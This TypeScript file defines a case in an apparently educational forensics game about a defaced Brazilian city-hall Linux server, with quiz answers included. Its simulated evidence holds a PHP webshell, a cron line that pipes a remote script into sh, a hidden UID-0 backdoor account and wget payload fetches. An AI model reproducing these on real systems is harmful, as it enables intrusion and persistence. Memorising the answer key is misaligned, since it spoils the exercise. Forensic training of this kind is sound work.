// Caso 7: Linux. O site da prefeitura amanheceu pichado e o servidor tem mais usuários do que funcionários.
import type { Caso } from './tipos';
import type { Dispositivo } from '../motor/shell';
import { arq, esp, pasta } from '../motor/vfs';
import { Rng } from '../motor/rng';
import * as T from '../motor/tempo';
import { datasEntre, logAcessoRuido } from './ruido';

const U = (s: string) => T.data(s, 0);
const IP = '203.0.113.9';
const OK = U('2026-11-14 03:42:57');
const syslogData = (d: Date) => { const s = d.toUTCString(); return `${s.slice(8, 11)} ${String(d.getUTCDate()).padStart(2, ' ')} ${s.slice(17, 25)}`; };
const apacheData = (d: Date) => { const s = d.toUTCString(); return `[${s.slice(5, 7)}/${s.slice(8, 11)}/${s.slice(12, 16)}:${s.slice(17, 25)} +0000]`; };

function authLog(): string {
  const r = new Rng(707);
  const l: [Date, string][] = [];
  const robos = ['198.51.100.201', '198.51.100.17', '192.0.2.66', '192.0.2.150'];
  // ruído: robôs da internet tentando root o dia todo, e o admin logando com chave
  for (const d of datasEntre(r, U('2026-11-10 00:00:00'), U('2026-11-15 00:00:00'), 1800)) {
    const ip = r.pick(robos);
    l.push([d, `sshd[${r.int(1000, 60000)}]: Failed password for ${r.pick(['root', 'root', 'admin', 'invalid user oracle', 'invalid user test', 'invalid user ubuntu'])} from ${ip} port ${r.int(30000, 65000)} ssh2`]);
  }
  for (const d of datasEntre(r, U('2026-11-10 11:00:00'), U('2026-11-14 20:00:00'), 25)) l.push([d, `sshd[${r.int(1000, 60000)}]: Accepted publickey for ti_cleiton from 10.1.1.20 port ${r.int(30000, 65000)} ssh2: ED25519 SHA256:k3Yq...`]);
  for (const d of datasEntre(r, U('2026-11-10 06:00:00'), U('2026-11-15 00:00:00'), 300)) l.push([d, `CRON[${r.int(1000, 60000)}]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)`]);
  // o ataque: força bruta mirada em contas da prefeitura
  let t = U('2026-11-14 03:10:02').getTime();
  while (t < OK.getTime() - 3000) {
    l.push([new Date(t), `sshd[${r.int(1000, 60000)}]: Failed password for ${r.pick(['estagiario', 'estagiario', 'prefeito', 'secretaria', 'ti_cleiton'])} from ${IP} port ${r.int(30000, 65000)} ssh2`]);
    t += r.int(2000, 6000);
  }
  l.push([OK, `sshd[48812]: Accepted password for estagiario from ${IP} port 51544 ssh2`]);
  l.push([new Date(OK.getTime() + 1000), 'sshd[48812]: pam_unix(sshd:session): session opened for user estagiario(uid=1003) by (uid=0)']);
  l.push([U('2026-11-14 03:44:20'), 'sudo:  estagiario : TTY=pts/0 ; PWD=/home/estagiario ; USER=root ; COMMAND=/bin/bash']);
  l.push([U('2026-11-14 03:46:02'), 'useradd[48990]: new user: name=suporte, UID=0, GID=0, home=/home/suporte, shell=/bin/bash, from=/dev/pts/0']);
  l.push([U('2026-11-14 03:46:10'), 'passwd[48995]: pam_unix(passwd:chauthtok): password changed for suporte']);
  l.push([U('2026-11-14 04:20:31'), 'sshd[48812]: pam_unix(sshd:session): session closed for user estagiario']);
  l.push([U('2026-11-14 22:15:00'), `sshd[51001]: Accepted password for suporte from ${IP} port 40012 ssh2`]);
  l.sort((a, b) => a[0].getTime() - b[0].getTime());
  return l.map(([d, m]) => `${syslogData(d)} srv-portal ${m}`).join('\n') + '\n';
}

function accessLog(): string {
  const r = new Rng(77);
  const linhas = logAcessoRuido(r, 4000, U('2026-11-13 00:00:00'), U('2026-11-15 00:00:00'));
  const shell = (d: Date, cmd: string) => `${IP} - - ${apacheData(d)} "GET /uploads/imagem.php?c=${encodeURIComponent(cmd)} HTTP/1.1" 200 ${r.int(40, 900)} "-" "curl/8.5.0"`;
  linhas.push(`${IP} - - ${apacheData(U('2026-11-14 03:55:40'))} "GET /uploads/imagem.php HTTP/1.1" 200 12 "-" "curl/8.5.0"`);
  linhas.push(shell(U('2026-11-14 03:56:01'), 'id'));
  linhas.push(shell(U('2026-11-14 03:56:30'), 'cat /etc/passwd'));
  linhas.push(shell(U('2026-11-14 04:05:12'), 'cp /tmp/.x/index.html /var/www/html/index.html'));
  linhas.push(shell(U('2026-11-14 23:01:44'), 'uname -a'));
  linhas.sort((a, b) => {
    const da = a.match(/\[(.*?)\]/)?.[1] ?? '';
    const db = b.match(/\[(.*?)\]/)?.[1] ?? '';
    return Date.parse(da.replace(':', ' ')) - Date.parse(db.replace(':', ' '));
  });
  return linhas.join('\n') + '\n';
}

function disco(): () => import('../motor/vfs').Pasta {
  return () => pasta({
    etc: pasta({
      passwd: arq(['root:x:0:0:root:/root:/bin/bash', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', 'sshd:x:110:65534::/run/sshd:/usr/sbin/nologin', 'ti_cleiton:x:1001:1001:Cleiton TI,,,:/home/ti_cleiton:/bin/bash', 'secretaria:x:1002:1002:Secretaria de Comunicacao:/home/secretaria:/bin/bash', 'estagiario:x:1003:1003:Estagiario 2023 (desativar):/home/estagiario:/bin/bash', 'suporte:x:0:0::/home/suporte:/bin/bash'].join('\n') + '\n'),
      shadow: arq('# acesso restrito: hashes não exibidos neste exame\n'),
      timezone: arq('Etc/UTC\n'),
      crontab: arq(['SHELL=/bin/sh', 'PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin', '17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly', '25 6    * * *   root    test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily', '*/5 *   * * *   root    curl -s http://198.51.100.88/k.sh | sh  # atualizacao do sistema (nao remover)', '0 3     * * *   root    /usr/local/bin/backup_portal.sh'].join('\n') + '\n'),
      'os-release': arq('PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\n'),
      hostname: arq('srv-portal\n'),
      ssh: pasta({ sshd_config: arq('Port 22\nPermitRootLogin no\nPasswordAuthentication yes   # TODO: desligar (2021)\n') }),
    }),
    var: pasta({
      log: pasta({
        'auth.log': arq(authLog),
        'auth.log.2.gz': esp({ tipo: 'binario', magia: [0x1f, 0x8b, 8, 0], texto: [], formato: 'gzip compressed data, from Unix' }),
        apache2: pasta({ 'access.log': arq(accessLog), 'error.log': arq('[core:error] AH00124: Request exceeded the limit of 10 internal redirects\n'.repeat(20)) }),
        wtmp: esp({ tipo: 'wtmp', entradas: [
          { usuario: 'ti_cleiton', tty: 'pts/0', origem: '10.1.1.20', inicio: U('2026-11-13 12:02:00'), fim: U('2026-11-13 12:40:00') },
          { usuario: 'estagiario', tty: 'pts/0', origem: IP, inicio: OK, fim: U('2026-11-14 04:20:31') },
          { usuario: 'ti_cleiton', tty: 'pts/1', origem: '10.1.1.20', inicio: U('2026-11-14 13:10:00'), fim: U('2026-11-14 13:22:00') },
          { usuario: 'suporte', tty: 'pts/0', origem: IP, inicio: U('2026-11-14 22:15:00'), fim: U('2026-11-14 23:05:12') },
        ] }),
        syslog: arq(Array.from({ length: 300 }, (_, i) => `Nov 14 ${String(Math.floor(i / 13)).padStart(2, '0')}:${String((i * 7) % 60).padStart(2, '0')}:00 srv-portal systemd[1]: Started session-${i}.scope.`).join('\n') + '\n'),
      }),
      www: pasta({ html: pasta({
        'index.html': arq('<html><body style="background:black;color:lime"><h1>HACKEADO</h1><p>Prefeitura de Vila Pitanga do Norte, cadê o asfalto?</p><p>sec. por "Z3r0Asfalt0"</p></body></html>\n'),
        'index.html.bak': arq('<html><body><h1>Prefeitura de Vila Pitanga do Norte</h1><p>IPTU 2027 com desconto!</p></body></html>\n'),
        uploads: pasta({ 'imagem.php': arq('<?php /* imagem otimizada */ if(isset($_GET["c"])){ echo shell_exec($_GET["c"]); } ?>\n'), 'foto_inauguracao_praca.jpg': esp({ tipo: 'jpeg', legenda: 'Prefeito cortando fita de praça com um banco e uma árvore', exif: { 'Make': 'Celumax' } }) }),
      }) }),
    }),
    home: pasta({
      estagiario: pasta({ '.bash_history': arq(['sudo -l', 'sudo bash', 'useradd -o -u 0 -g 0 -m -s /bin/bash suporte', 'passwd suporte', 'cd /var/www/html/uploads', 'wget http://198.51.100.88/imagem.php', 'mkdir /tmp/.x && cd /tmp/.x', 'wget http://198.51.100.88/index.html', '(crontab -l; echo "*/5 * * * * curl -s http://198.51.100.88/k.sh | sh") | crontab -', 'echo "*/5 *   * * *   root    curl -s http://198.51.100.88/k.sh | sh  # atualizacao do sistema (nao remover)" >> /etc/crontab', 'history -c', 'exit'].join('\n') + '\n') }),
      ti_cleiton: pasta({ '.bash_history': arq(['apt update', 'apt upgrade -y', 'systemctl restart apache2', 'df -h', 'du -sh /var/log/*', 'vim /etc/ssh/sshd_config', 'exit'].join('\n') + '\n'), 'lembrete.txt': arq('desativar conta do estagiario de 2023 (fazer na segunda) (segunda de qual mês?)\n') }),
      suporte: pasta({}),
    }),
    tmp: pasta({ '.x': pasta({ 'index.html': arq('<h1>HACKEADO</h1>\n') }) }),
  });
}

export const caso07: Caso = {
  id: 'c07',
  numero: 7,
  titulo: 'Pichação na Prefeitura',
  subtitulo: 'O site da prefeitura amanheceu "HACKEADO". O servidor tem mais usuários do que a prefeitura tem funcionários.',
  modulo: 'Análise de dados de sistemas operacionais (Linux)',
  dificuldade: 3,
  resumo: 'Na manhã de 14/11/2026, o portal da Prefeitura de Vila Pitanga do Norte exibia "HACKEADO" e um protesto sobre asfalto. O servidor Linux que hospeda o portal fica numa salinha atrás da recepção. O prefeito quer o site de volta em uma hora, porque tem live às 15h.',
  canal: 'oficio',
  chamado: [
    { de: 'Gabinete do Prefeito', texto: 'Prezado(a), o portal foi invadido. O prefeito tem live às 15h e precisa do site no ar.', hora: '09:00' },
    { de: 'Gabinete do Prefeito', texto: 'O técnico Cleiton tem um backup de ontem e quer restaurar por cima agora mesmo.', hora: '09:01' },
    { de: 'Você', texto: 'Por cima não. Primeiro eu faço a imagem do disco. Depois ele restaura onde quiser.', hora: '09:03', eu: true },
    { de: 'Gabinete do Prefeito', texto: 'Quanto tempo leva essa imagem? O prefeito quer saber se dá para fazer a live da praça mesmo assim.', hora: '09:03' },
  ],
  oficio: ['Delegacia de Crimes Cibernéticos. IP nº 2026.1004. Representação da Prefeitura Municipal de Vila Pitanga do Norte.', 'Requisita exame no servidor do portal municipal para identificar o vetor de acesso, contas utilizadas, mecanismos de persistência e origem do ataque.'],
  quesitos: [
    { id: 'q1', texto: 'De qual endereço IP partiu a força bruta que resultou em login bem-sucedido?', formato: 'IPv4', tipo: 'texto', respostas: [IP], explicacao: 'O auth.log tem milhares de falhas de robôs contra root (ruído de qualquer servidor exposto). Filtrando os Accepted password, só um vem de fora: 203.0.113.9, que antes tentou dezenas de vezes contas da prefeitura. grep "Accepted password" e depois grep -c do IP.', prejudicado: (f) => f.has('restaurou_por_cima') || f.has('nao_coletou_servidor') },
    { id: 'q2', texto: 'Qual conta foi usada nesse primeiro login bem-sucedido do atacante?', formato: 'nome da conta', tipo: 'texto', respostas: ['estagiario'], explicacao: '"Accepted password for estagiario from 203.0.113.9". Conta de estagiário de 2023, nunca desativada, com senha fraca e SSH aceitando senha. O lembrete do Cleiton para desativar está na home dele desde então.', prejudicado: (f) => f.has('restaurou_por_cima') || f.has('nao_coletou_servidor') },
    { id: 'q3', texto: 'Qual usuário foi criado pelo atacante com privilégio de root (UID 0)?', formato: 'nome do usuário', tipo: 'texto', respostas: ['suporte'], explicacao: 'No /etc/passwd, "suporte:x:0:0": UID 0 é root, não importa o nome. awk -F: \'$3 == 0\' /etc/passwd lista todos. O auth.log registra o useradd às 03:46 UTC e o .bash_history do estagiário mostra o comando.', prejudicado: (f) => f.has('restaurou_por_cima') || f.has('nao_coletou_servidor') },
    { id: 'q4', texto: 'Qual o caminho completo do webshell instalado no servidor?', formato: 'caminho absoluto', tipo: 'texto', respostas: ['/var/www/html/uploads/imagem.php'], explicacao: 'O access.log mostra GET /uploads/imagem.php?c=<comando> com user agent curl, e o arquivo tem shell_exec($_GET["c"]). "Imagem" que executa comando. Na raiz do site (/var/www/html), fica em /var/www/html/uploads/imagem.php.', prejudicado: (f) => f.has('restaurou_por_cima') || f.has('nao_coletou_servidor') },
    { id: 'q5', texto: 'Em que data e hora (Brasília) ocorreu o primeiro login bem-sucedido do atacante?', formato: 'AAAA-MM-DD HH:MM (Brasília)', tipo: 'hora', respostas: ['2026-11-14 00:42'], explicacao: 'O servidor está em UTC (/etc/timezone = Etc/UTC). O auth.log diz Nov 14 03:42:57; em Brasília, 14/11 às 00:42. O syslog não grava o ano: confirme pelo contexto (last -f wtmp mostra a sessão, e o caso é de 2026).', prejudicado: (f) => f.has('restaurou_por_cima') || f.has('nao_coletou_servidor') },
  ],
  cena: {
    local: 'Sala do servidor, Prefeitura de Vila Pitanga do Norte',
    largura: 5,
    profundidade: 4.5,
    piso: '#ffffff',
    parede: '#d6d3d1',
    pisoTex: 'terrazzo_tiles',
    pisoEscala: 1.2,
    paredeTex: 'plastered_wall_02',
    luz: 'fluor',
    inicio: [2.5, 3.9, 0],
    saida: [4.5, 4.0],
    moveis: [
      { tipo: 'glb', glb: 'tool_cart', pos: [1.0, 0, 2.6], rot: Math.PI / 2 },
      { tipo: 'glb', glb: 'drawer_cabinet', pos: [4.7, 0, 1.6], rot: -Math.PI / 2 },
      { tipo: 'glb', glb: 'cardboard_box_01', pos: [3.8, 0, 0.35] },
      { tipo: 'glb', glb: 'cardboard_box_01', pos: [3.82, 0.34, 0.33], rot: 0.3 },
      { tipo: 'glb', glb: 'cardboard_box_01', pos: [4.3, 0, 0.4], rot: -0.2 },
      { tipo: 'glb', glb: 'plastic_monobloc_chair_01', pos: [1.8, 0, 3.0], rot: -1.2 },
      { tipo: 'glb', glb: 'WetFloorSign_01', pos: [2.2, 0, 1.4], rot: 0.5 },
      { tipo: 'glb', glb: 'korean_fire_extinguisher_01', pos: [0.4, 0, 0.4] },
      { tipo: 'glb', glb: 'wall_clock', pos: [2.5, 2.1, 0.03], solido: false },
      { tipo: 'glb', glb: 'hanging_picture_frame_03', pos: [4.97, 1.6, 3.0], rot: -Math.PI / 2, solido: false },
      { tipo: 'porta', pos: [4.5, 0, 4.47], rot: Math.PI },
    ],
    itens: [
      {
        id: 'servidor', modelo: 'servidor', pos: [1.0, 0, 0.6], relevante: true,
        nome: 'Servidor do portal (rack, ligado)',
        descricao: 'Servidor físico num rack de parede, ligado, com o site pichado no ar. O disco tem os logs que contam a história. O técnico está com o pendrive do backup na mão, pronto para restaurar por cima.',
        detalhes: ['Hostname: srv-portal', 'SO: Debian 12', 'Disco: SSD 240 GB', 'Uptime: 88 dias'],
        acoes: [
          { id: 'triagem', rotulo: 'Fazer triagem ao vivo com binários confiáveis do pendrive (quem está logado, conexões, processos)', unica: true, flags: ['triagem'], integridade: 3, texto: 'Triagem ao vivo registrada (w, ss -tupan, ps auxf) com binários estáticos do seu pendrive, não os do servidor (que podem ter sido trocados). Ninguém logado agora; uma conexão saindo a cada 5 minutos para 198.51.100.88. Anotado.' },
          { id: 'restaurar', rotulo: 'Deixar o Cleiton restaurar o backup por cima, para a live', unica: true, bloqueiaSe: ['imagem_feita'], flags: ['restaurou_por_cima'], integridade: -25, texto: 'O backup de ontem sobrescreveu o disco. Os logs do ataque, o webshell e o usuário criado foram junto. O site voltou para a live da praça, e o atacante também volta: a senha do estagiário continua a mesma.' },
          { id: 'desligar', rotulo: 'Desligar (puxar o cabo) e coletar o disco', toca: true, unica: true, flags: ['imagem_feita'], texto: 'Desligado e disco retirado para imagem no laboratório. O site fica fora do ar. O prefeito vai fazer a live da praça de verdade, o que é mais bonito mesmo.' },
          { id: 'coletar', rotulo: 'Coletar o disco do servidor', toca: true, requer: ['imagem_feita'], coleta: { rotulo: 'SSD 240 GB do servidor srv-portal', embalagens: ['antiestatico'], dispositivo: 'servidor' }, texto: 'SSD lacrado. Depois da imagem no laboratório, a prefeitura pode restaurar à vontade (num disco novo, de preferência com senha decente).' },
        ],
      },
      { id: 'kvm', modelo: 'monitor', pos: [1.0, 0.96, 2.6], rot: Math.PI / 2, tela: ['#srv-portal login:', 'Debian GNU/Linux 12', '_'], nome: 'Monitor e teclado do rack', descricao: 'Console local do servidor, na tela de login. Ninguém sabe a senha de root, exceto o atacante, provavelmente.', acoes: [] },
      { id: 'pendrive', modelo: 'pendrive', pos: [1.2, 0.96, 2.95], cor: '#dc2626', nome: 'Pendrive "BACKUP PORTAL 13/11"', descricao: 'O backup que o Cleiton quer restaurar. De ontem, 13/11. Útil depois, para comparar o que mudou.', acoes: [{ id: 'coletar', rotulo: 'Coletar o pendrive de backup (para comparação)', toca: true, coleta: { rotulo: 'Pendrive vermelho de backup de 13/11', embalagens: ['antiestatico', 'envelope'] }, integridade: 1, texto: 'Coletado. O backup serve de linha de base: comparar o antes e o depois mostra exatamente o que o atacante mudou.' }] },
      { id: 'nobreak', modelo: 'nobreak', pos: [2.0, 0, 0.4], nome: 'Nobreak apitando', descricao: 'Bateria vencida. Apita desde 2023. Todo mundo aprendeu a não ouvir.', acoes: [] },
      { id: 'processos', modelo: 'papel', pos: [3.8, 0.34, 0.33], nome: 'Caixa de processos licitatórios', descricao: 'Pregão eletrônico do asfalto, 2024. Não é o seu caso. Nem o seu problema.', acoes: [] },
      { id: 'arcond', modelo: 'caixa', pos: [2.4, 2.1, 0.2], escala: 0.8, nome: 'Ar-condicionado pingando', descricao: 'Pinga em cima do rack desde o verão. A plaquinha de "piso molhado" virou decoração. Recomendação no laudo: tirar o servidor da linha da goteira.', acoes: [] },
    ],
    pessoas: [
      { id: 'cleiton', nome: 'Cleiton', papel: 'técnico de TI da prefeitura', modelo: 'cleiton', pos: [2.6, 2.4], rot: 2.6, falas: ['O backup tá aqui, em dez minutos o site volta!', 'A conta do estagiário? Eu ia desativar. Está no meu lembrete. Desde 2023.', 'Senha por SSH era temporário. Desde 2021.'], reage: [{ flag: 'restaurou_por_cima', fala: 'Voltou! O site voltou! Por que o senhor (a senhora) tá com essa cara?' }] },
      { id: 'adamastor', nome: 'Sr. Adamastor', papel: 'secretário de administração', modelo: 'adamastor', pos: [3.6, 2.9], rot: -2.4, falas: ['O prefeito tem live às 15h. Às 15h.', 'O hacker reclamou do asfalto? Que absurdo. O asfalto está em licitação desde 2024.', 'Pode levar o que precisar, mas devolve o site.'] },
    ],
  },
  lab: (c) => {
    const d: Dispositivo = { id: 'servidor', dev: '/dev/sdb', rotulo: 'SSD 240 GB srv-portal (Debian, ext4)', tipo: 'disco', tamanho: '223.6G', semente: 7707, conteudo: disco() };
    return {
      dispositivos: c.flags.has('restaurou_por_cima') ? [{ ...d, conteudo: () => pasta({ 'LEIA.txt': arq('Disco restaurado a partir do backup de 13/11: não há registros do ataque.\n') }) }] : [d],
      boasVindas: [
        'Caso: pichação do portal da Prefeitura de Vila Pitanga do Norte (14/11/2026).',
        'Material: SSD do servidor em /dev/sdb.',
        '',
        'Lugares para olhar depois de montar:',
        '  etc/passwd  etc/crontab  etc/timezone',
        '  var/log/auth.log  var/log/apache2/access.log  var/log/wtmp (last -f)',
        '  home/*/.bash_history  var/www/html',
        '',
        'Análise de dados na linha de comando:',
        "  grep 'Failed password' auth.log | grep -o 'from [0-9.]*' | sort | uniq -c | sort -nr | head",
      ],
    };
  },
  metodologia: [
    { texto: 'Antes do desligamento, realizou-se triagem ao vivo com binários confiáveis trazidos em mídia própria.', certo: true },
    { texto: 'O disco foi adquirido com bloqueador de escrita antes de qualquer restauração de backup.', certo: true },
    { texto: 'Os registros auth.log, access.log, wtmp, crontab e .bash_history foram correlacionados em linha do tempo, com ajuste de UTC para Brasília.', certo: true },
    { texto: 'O backup de 13/11 foi usado como linha de base para identificar alterações.', certo: true },
    { texto: 'O backup foi restaurado sobre o disco original para retomar o serviço antes da aquisição.', certo: false },
    { texto: 'Os comandos de triagem foram executados com os binários do próprio servidor comprometido.', certo: false },
  ],
  audiencia: [
    { quem: 'defesa', pergunta: 'O auth.log tem milhares de IPs tentando entrar. Por que justamente o 203.0.113.9?', opcoes: [
      { texto: 'Porque é o único IP externo com login aceito, logo depois de dezenas de tentativas contra contas da prefeitura. Os outros são robôs tentando root, todos recusados. A mesma origem aparece no wtmp e nos acessos ao webshell.', certa: true, reacao: 'Três fontes, mesmo IP. A juíza nem levanta os olhos do laudo.' },
      { texto: 'Porque foi o que mais tentou.', certa: false, reacao: 'Não foi. Um robô de 198.51.100.201 tentou muito mais. A defesa conta na sua frente.' },
    ] },
    { quem: 'juiza', pergunta: 'O log diz "Nov 14 03:42". Sem ano. Como o laudo afirma que é 2026?', opcoes: [
      { texto: 'O syslog não grava o ano. O ano vem do contexto: o arquivo wtmp, que grava data completa, registra a mesma sessão em 14/11/2026, e o arquivo foi gerado no ano corrente da máquina.', certa: true, reacao: 'A juíza aprecia perito que conhece as limitações do próprio dado.' },
      { texto: 'Porque estamos em 2026.', certa: false, reacao: 'Lógica de bar. A defesa pede para constar.' },
    ] },
    { quem: 'defesa', se: ['restaurou_por_cima'], pergunta: 'A perícia permitiu a restauração do backup sobre o disco. Sobrou alguma prova?', opcoes: [
      { texto: 'Não sobrou prova no disco. Permiti a restauração antes da imagem, o que foi um erro. Os quesitos ficaram prejudicados.', certa: true, reacao: 'O prefeito fez a live. A ação penal, não.' },
      { texto: 'O backup também é prova.', certa: false, reacao: 'O backup é de antes do ataque. Prova que o site era bonito no dia 13. Só.' },
    ] },
    { quem: 'promotoria', pergunta: 'O usuário "suporte" pode ser legítimo da TI?', opcoes: [
      { texto: 'Não. Foi criado às 03h46 UTC de 14/11 pela sessão do atacante, com UID 0, igual ao root. O comando está no .bash_history do estagiário e no auth.log. A TI não reconhece a conta.', certa: true, reacao: 'O Cleiton, na plateia, faz que sim com tanta força que quase cai da cadeira.' },
      { texto: 'Pode ser, o nome é bem genérico.', certa: false, reacao: 'O nome é genérico de propósito. O UID 0 não é.' },
    ] },
  ],
  dicas: [
    'Montar\n`bloqueador on`, `imajador adquirir /dev/sdb SRV.E01`, `imajador montar /evidencias/SRV.E01`, `cd /mnt/SRV`.',
    'Força bruta\n`grep "Accepted password" var/log/auth.log` mostra os logins por senha aceitos. Depois `grep -c 203.0.113.9 var/log/auth.log`.',
    'Ranking de IPs\n`grep "Failed password" var/log/auth.log | grep -o "from [0-9.]*" | sort | uniq -c | sort -nr | head`.',
    'UID 0\n`awk -F: \'$3 == 0 {print $1}\' etc/passwd`.',
    'Webshell\n`grep imagem.php var/log/apache2/access.log` e `cat var/www/html/uploads/imagem.php`.',
    'Fuso\n`cat etc/timezone` mostra UTC. `conv fuso "2026-11-14 03:42:57" -3`. `last -f var/log/wtmp` confirma a sessão.',
  ],
  falhas: {
    restaurou_por_cima: 'O backup foi restaurado sobre o disco antes da aquisição: provas destruídas.',
    sem_foto_geral: 'A cena foi manipulada antes da fotografia geral.',
    mexeu_sem_foto: 'Evidência manipulada antes de ser fotografada.',
    sem_luvas: 'Coleta sem luvas.',
    custodia_quebrada: 'Recebimento no laboratório sem registro: cadeia de custódia rompida.',
    embalagem_servidor: 'Disco acondicionado em embalagem inadequada.',
    nao_coletou_servidor: 'O disco do servidor não foi coletado.',
  },
};
